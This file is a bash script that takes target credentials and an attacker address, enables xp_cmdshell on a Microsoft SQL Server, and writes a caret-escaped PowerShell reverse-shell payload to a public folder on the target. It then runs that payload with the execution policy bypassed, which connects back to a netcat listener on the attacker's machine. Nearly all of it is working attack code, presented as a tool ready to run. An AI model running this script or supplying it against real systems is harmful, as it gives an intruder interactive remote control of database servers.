#!/bin/bash
# Usage: ./mssql_reverse_shell.sh <TARGET_IP> <USERNAME> <PASSWORD> <ATTACKER_IP> <REVERSE_PORT>
if [ "$#" -ne 5 ]; then
    echo "Usage: $0 <TARGET_IP> <USERNAME> <PASSWORD> <ATTACKER_IP> <REVERSE_PORT>"
    exit 1
fi

TARGET_IP="$1"
USERNAME="$2"
PASSWORD="$3"
ATTACKER_IP="$4"
REVERSE_PORT="$5"

echo "==============================="
echo "[+] Start a listener on your machine before running this script:"
echo "    nc -lvnp $REVERSE_PORT"
echo "==============================="
echo ""
read -p "[+] Press Enter to continue after starting the listener..."

# Ensure sqlcmd is installed
if ! command -v sqlcmd &>/dev/null; then
    echo "[!] sqlcmd is not installed. Please install it first."
    exit 1
fi

# Check if xp_cmdshell is enabled
ENABLE_STATUS=$(sqlcmd -C -S "$TARGET_IP" -U "$USERNAME" -P "$PASSWORD" \
    -Q "SET NOCOUNT ON; SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';" \
    -h -1 -W | tr -d '[:space:]')
if [ "$ENABLE_STATUS" != "1" ]; then
    echo "[+] xp_cmdshell is not enabled. Enabling it now..."
    sqlcmd -C -S "$TARGET_IP" -U "$USERNAME" -P "$PASSWORD" \
      -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
    sqlcmd -C -S "$TARGET_IP" -U "$USERNAME" -P "$PASSWORD" \
      -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
fi

echo "[+] xp_cmdshell is enabled. Proceeding with payload creation..."

# Remove any existing payload file on the target
sqlcmd -C -S "$TARGET_IP" -U "$USERNAME" -P "$PASSWORD" \
  -Q "EXEC xp_cmdshell 'del C:\\Users\\Public\\shell.ps1'"

# Define the reverse shell payload in multiple short lines.
# Note: To avoid cmd.exe misinterpreting the pipe (|) and redirection (>),
# we escape them using caret (^). When processed, the output file will contain
# the intended characters.
payload_lines=(
  "\$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$REVERSE_PORT);"
  "\$stream = \$client.GetStream();"
  "[byte[]]\$bytes = 0..65535^|ForEach-Object {0};"
  "while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){"
  "  \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);"
  "  \$sendback = (iex \$data 2>&1 ^| Out-String);"
  "  \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '^> ';"
  "  \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);"
  "  \$stream.Write(\$sendbyte,0,\$sendbyte.Length);"
  "  \$stream.Flush();"
  "};"
  "\$client.Close();"
)

# Append each payload line to C:\Users\Public\shell.ps1 on the target.
# We double any single quotes for proper T-SQL escaping.
for line in "${payload_lines[@]}"; do
    line_escaped=$(echo "$line" | sed "s/'/''/g")
    sqlcmd -C -S "$TARGET_IP" -U "$USERNAME" -P "$PASSWORD" \
      -Q "EXEC xp_cmdshell 'echo $line_escaped >> C:\\Users\\Public\\shell.ps1'"
done

echo "[+] Payload file created. Verifying its existence..."
sqlcmd -C -S "$TARGET_IP" -U "$USERNAME" -P "$PASSWORD" \
  -Q "EXEC xp_cmdshell 'dir C:\\Users\\Public\\shell.ps1'"

echo "[+] Executing the payload..."
sqlcmd -C -S "$TARGET_IP" -U "$USERNAME" -P "$PASSWORD" \
  -Q "EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\shell.ps1'"

echo "[+] Reverse shell attempt sent. If successful, check your listener (nc -lvnp $REVERSE_PORT)."
